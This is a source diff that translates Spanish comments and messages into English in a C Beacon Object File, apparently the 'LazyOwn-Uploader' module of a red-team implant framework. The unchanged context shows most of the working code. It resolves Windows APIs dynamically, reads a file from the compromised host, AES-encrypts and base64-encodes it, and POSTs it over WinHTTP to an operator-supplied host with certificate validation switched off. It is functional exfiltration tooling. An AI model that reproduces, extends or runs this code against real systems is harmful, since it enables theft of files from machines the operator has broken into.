@@ -3,13 +3,13 @@
 #include "beacon.h"
 
 // ================================
-// IMPORTS DIRECTOS
+// DIRECT IMPORTS
 // ================================
 extern PVOID __imp_LoadLibraryA;
 extern PVOID __imp_GetProcAddress;
 
 // ================================
-// TIPOS MANUALES
+// MANUAL TYPES
 // ================================
 typedef unsigned char uint8_t;
 typedef unsigned int uint32_t;
@@ -48,7 +48,7 @@ typedef struct {
 } AES_ctx;
 
 // ================================
-// FUNCIONES AUXILIARES
+// HELPER FUNCTIONS
 // ================================
 static int my_strlen(const char *s) {
     int len = 0;
@@ -88,7 +88,7 @@ static char* my_strchr(const char *s, int c)
 }
 
 // ================================
-// AES (sin datos globales)
+// AES (no global data)
 // ================================
 static uint8_t xtime(uint8_t x) {
     return ((x << 1) ^ (((x >> 7) & 1) * 0x1b));
@@ -232,27 +232,27 @@ static void ParseUploadArgs(const char* args, int alen,
                             char* local_path, char* host, int* port,
                             char* endpoint, char* aes_key_hex)
 {
-    /* copia local garantizada con 0-final */
+    /* local copy guaranteed null-terminated */
     char buf[512];
     int  max = (alen >= sizeof(buf)-1) ? sizeof(buf)-1 : alen;
     my_memcpy(buf, args, max);
     
     buf[max] = 0;
 
-    /* campos */
+    /* fields */
     char *p = buf, *next;
     #define NEXT_TOKEN(dst,lim) do{                                          \
         next = my_strchr(p, '/');                                            \
-        if (!next) return;       /* formato inválido */                      \
+        if (!next) return;       /* invalid format */                      \
         int len = (int)(next - p);                                           \
-        if (len >= (lim)) return;/* campo demasiado largo */                 \
+        if (len >= (lim)) return;/* field too long */                 \
         my_memcpy(dst, p, len); dst[len] = 0;                                \
         p = next + 1;                                                        \
     }while(0)
 
     NEXT_TOKEN(local_path, 128);
     NEXT_TOKEN(host,      64);
-    /* puerto es numérico */
+    /* port is numeric */
     char tmp[16]; NEXT_TOKEN(tmp,16);
     *port = 0;
     for (char *c = tmp; *c; c++){
@@ -260,7 +260,7 @@ static void ParseUploadArgs(const char* args, int alen,
         *port = *port*10 + (*c - '0');
     }
     NEXT_TOKEN(endpoint,  64);
-    /* lo que queda es la clave */
+    /* the rest is the key */
     int klen = my_strlen(p);
     if (klen != 64) return;
     my_memcpy(aes_key_hex, p, 64);
@@ -268,10 +268,10 @@ static void ParseUploadArgs(const char* args, int alen,
 }
 
 // ================================
-// FUNCIÓN PRINCIPAL
+// MAIN FUNCTION
 // ================================
 void go(char *args, int alen) {
-    // === TABLAS AES EN STACK ===
+    // === AES TABLES ON STACK ===
     uint8_t sbox[256] = {
         0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,
         0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0,
@@ -299,7 +299,7 @@ void go(char *args, int alen) {
     FARPROC (WINAPI *pGetProcAddress)(HMODULE, LPCSTR) = (FARPROC(WINAPI*)(HMODULE, LPCSTR))__imp_GetProcAddress;
 
     if (!pLoadLibraryA || !pGetProcAddress) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló resolución de loader\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Loader resolution failed\n");
         return;
     }
 
@@ -308,7 +308,7 @@ void go(char *args, int alen) {
     HMODULE hWinHttp = pLoadLibraryA("winhttp.dll");
 
     if (!hKernel32 || !hAdvapi32 || !hWinHttp) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló carga de DLLs\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] DLL loading failed\n");
         return;
     }
 
@@ -318,11 +318,11 @@ void go(char *args, int alen) {
     t_VirtualFree pVirtualFree = (t_VirtualFree)pGetProcAddress(hKernel32, "VirtualFree");
 
     if (!pVirtualAlloc || !pVirtualFree) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló resolución de VirtualAlloc/Free\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] VirtualAlloc/Free resolution failed\n");
         return;
     }
 
-    // === PARSEO SEGURO CON "/" ===
+    // === SAFE PARSING WITH "/" ===
     char local_path[128] = {0};
     char host[64] = {0};
     int port = 0;
@@ -331,26 +331,26 @@ void go(char *args, int alen) {
 
     ParseUploadArgs(args, alen, local_path, host, &port, endpoint, aes_key_hex);
 
-    // validar longitud de clave
+    // validate key length
     int key_len = my_strlen(aes_key_hex);
     if (key_len != 64) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Clave AES debe ser 64 caracteres hex (actual: %d)\n", key_len);
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] AES key must be 64 hex characters (current: %d)\n", key_len);
         return;
     }
 
-    // validar puerto
+    // validate port
     if (port <= 0 || port > 65535) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Puerto fuera de rango\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Port out of range\n");
         return;
     }
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][+] Iniciando subida de archivo...\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][+] Starting file upload...\n");
     if (my_contains_dotdot(local_path)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Path traversal detectado\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Path traversal detected\n");
         return;
     }
 
-    // Resolución de APIs
+    // API resolution
     typedef HANDLE (WINAPI *t_CreateFileA)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
     typedef BOOL (WINAPI *t_ReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
     typedef BOOL (WINAPI *t_GetFileSizeEx)(HANDLE, PLARGE_INTEGER);
@@ -391,11 +391,11 @@ void go(char *args, int alen) {
         !pCloseHandle || !pMultiByteToWideChar || !pCryptAcquireContextA || !pCryptGenRandom ||
         !pCryptReleaseContext || !pWinHttpOpen || !pWinHttpConnect || !pWinHttpOpenRequest ||
         !pWinHttpSendRequest || !pWinHttpWriteData || !pWinHttpCloseHandle) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló resolución de APIs\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] API resolution failed\n");
         goto cleanup;
     }
 
-    // Convertir clave hex a binario
+    // Convert hex key to binary
     uint8_t aes_key_bin[32] = {0};
     for (int i = 0; i < 64; i += 2) {
         char hex_byte[3] = {aes_key_hex[i], aes_key_hex[i+1], '\0'};
@@ -409,16 +409,16 @@ void go(char *args, int alen) {
         aes_key_bin[i/2] = val;
     }
 
-    // Leer archivo
+    // Read file
     HANDLE hFile = pCreateFileA(local_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] No se pudo abrir el archivo: %s\n", local_path);
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Could not open file: %s\n", local_path);
         goto cleanup;
     }
 
     LARGE_INTEGER fileSize = {0};
     if (!pGetFileSizeEx(hFile, &fileSize) || fileSize.QuadPart <= 0 || fileSize.QuadPart > (10 * 1024 * 1024)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Archivo inválido o demasiado grande\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Invalid file or too large\n");
         pCloseHandle(hFile);
         goto cleanup;
     }
@@ -426,25 +426,25 @@ void go(char *args, int alen) {
     SIZE_T bufSize = (SIZE_T)fileSize.QuadPart;
     char* fileBuffer = (char*)pVirtualAlloc(NULL, bufSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!fileBuffer) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló asignación de memoria\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Memory allocation failed\n");
         pCloseHandle(hFile);
         goto cleanup;
     }
 
     DWORD bytesRead = 0;
     if (!pReadFile(hFile, fileBuffer, (DWORD)bufSize, &bytesRead, NULL) || bytesRead != bufSize) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló lectura del archivo\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] File read failed\n");
         pCloseHandle(hFile);
         pVirtualFree(fileBuffer, 0, MEM_RELEASE);
         goto cleanup;
     }
     pCloseHandle(hFile);
 
-    // Cifrar
+    // Encrypt
     SIZE_T total_size = 16 + bufSize;
     uint8_t* encryptBuffer = (uint8_t*)pVirtualAlloc(NULL, total_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!encryptBuffer) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló buffer de cifrado\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Encryption buffer failed\n");
         pVirtualFree(fileBuffer, 0, MEM_RELEASE);
         goto cleanup;
     }
@@ -452,7 +452,7 @@ void go(char *args, int alen) {
     HCRYPTPROV hProv = 0;
     if (!pCryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT) ||
         !pCryptGenRandom(hProv, 16, encryptBuffer)) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló generación de IV\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] IV generation failed\n");
         if (hProv) pCryptReleaseContext(hProv, 0);
         pVirtualFree(encryptBuffer, 0, MEM_RELEASE);
         pVirtualFree(fileBuffer, 0, MEM_RELEASE);
@@ -467,23 +467,23 @@ void go(char *args, int alen) {
     AES_init_ctx(&ctx, aes_key_bin, sbox, Rcon);
     AES_CFB_encrypt_buffer(&ctx, encryptBuffer, encryptBuffer + 16, (uint32_t)bufSize, sbox);
 
-    // Codificar en base64
+    // Encode in base64
     char* b64 = my_base64_encode(encryptBuffer, (uint32_t)total_size, pVirtualAlloc, pVirtualFree);
     my_memset(encryptBuffer, 0, total_size);
     pVirtualFree(encryptBuffer, 0, MEM_RELEASE);
 
     if (!b64) {
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló codificación base64\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Base64 encoding failed\n");
         goto cleanup;
     }
 
-    // Convertir host y endpoint a wchar_t
+    // Convert host and endpoint to wchar_t
     int host_len = my_strlen(host) + 1;
     wchar_t* w_host = (wchar_t*)pVirtualAlloc(NULL, host_len * sizeof(wchar_t), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     if (!w_host) {
         my_memset(b64, 0, my_strlen(b64));
         pVirtualFree(b64, 0, MEM_RELEASE);
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló conversión de host\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Host conversion failed\n");
         goto cleanup;
     }
     pMultiByteToWideChar(CP_UTF8, 0, host, -1, w_host, host_len);
@@ -494,12 +494,12 @@ void go(char *args, int alen) {
         my_memset(b64, 0, my_strlen(b64));
         pVirtualFree(b64, 0, MEM_RELEASE);
         pVirtualFree(w_host, 0, MEM_RELEASE);
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló conversión de endpoint\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Endpoint conversion failed\n");
         goto cleanup;
     }
     pMultiByteToWideChar(CP_UTF8, 0, endpoint, -1, w_endpoint, ep_len);
 
-    // Subir
+    // Upload
     DWORD flags = 0x00800000;
     HINTERNET hSession = pWinHttpOpen(L"LazyOwn-Uploader/1.0", 0, NULL, NULL, 0);
     if (!hSession) {
@@ -507,7 +507,7 @@ void go(char *args, int alen) {
         pVirtualFree(b64, 0, MEM_RELEASE);
         pVirtualFree(w_host, 0, MEM_RELEASE);
         pVirtualFree(w_endpoint, 0, MEM_RELEASE);
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló WinHttpOpen\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] WinHttpOpen failed\n");
         goto cleanup;
     }
 
@@ -518,7 +518,7 @@ void go(char *args, int alen) {
         pVirtualFree(b64, 0, MEM_RELEASE);
         pVirtualFree(w_host, 0, MEM_RELEASE);
         pVirtualFree(w_endpoint, 0, MEM_RELEASE);
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló WinHttpConnect\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] WinHttpConnect failed\n");
         goto cleanup;
     }
 
@@ -529,8 +529,8 @@ void go(char *args, int alen) {
                         SECURITY_FLAG_IGNORE_CERT_CN_INVALID |
                         SECURITY_FLAG_IGNORE_CERT_DATE_INVALID;
         if (!pWinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwOption, sizeof(dwOption))) {
-            BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][!] WinHttpSetOption falló (ignorar cert)\n");
-            // No fallamos aquí, seguimos intentando
+            BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][!] WinHttpSetOption failed (ignore cert)\n");
+            // We don't fail here, keep trying
         }
     }    
     if (!hRequest) {
@@ -540,7 +540,7 @@ void go(char *args, int alen) {
         pVirtualFree(b64, 0, MEM_RELEASE);
         pVirtualFree(w_host, 0, MEM_RELEASE);
         pVirtualFree(w_endpoint, 0, MEM_RELEASE);
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló WinHttpOpenRequest\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] WinHttpOpenRequest failed\n");
         goto cleanup;
     }
 
@@ -553,7 +553,7 @@ void go(char *args, int alen) {
         pVirtualFree(b64, 0, MEM_RELEASE);
         pVirtualFree(w_host, 0, MEM_RELEASE);
         pVirtualFree(w_endpoint, 0, MEM_RELEASE);
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló WinHttpSendRequest\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] WinHttpSendRequest failed\n");
         goto cleanup;
     }
 
@@ -566,7 +566,7 @@ void go(char *args, int alen) {
         pVirtualFree(b64, 0, MEM_RELEASE);
         pVirtualFree(w_host, 0, MEM_RELEASE);
         pVirtualFree(w_endpoint, 0, MEM_RELEASE);
-        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] Falló WinHttpWriteData\n");
+        BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][-] WinHttpWriteData failed\n");
         goto cleanup;
     }
 
@@ -578,7 +578,7 @@ void go(char *args, int alen) {
     pVirtualFree(w_host, 0, MEM_RELEASE);
     pVirtualFree(w_endpoint, 0, MEM_RELEASE);
 
-    BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][+] Archivo subido exitosamente\n");
+    BeaconPrintf(CALLBACK_OUTPUT, "[UPLOAD][+] File uploaded successfully\n");
 
 cleanup:
     typedef BOOL (WINAPI *t_FreeLibrary)(HMODULE);
